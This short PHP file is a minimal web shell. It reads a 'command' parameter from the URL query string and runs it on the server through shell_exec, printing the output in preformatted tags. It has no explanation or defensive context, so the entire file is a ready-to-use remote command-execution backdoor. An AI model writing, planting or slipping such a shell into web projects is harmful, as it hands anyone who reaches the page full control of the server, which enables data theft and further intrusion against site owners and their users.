<?php
  $cmd = $_GET['command'];
  echo "<pre>";
  echo shell_exec($cmd);
  echo "<pre>";
?>
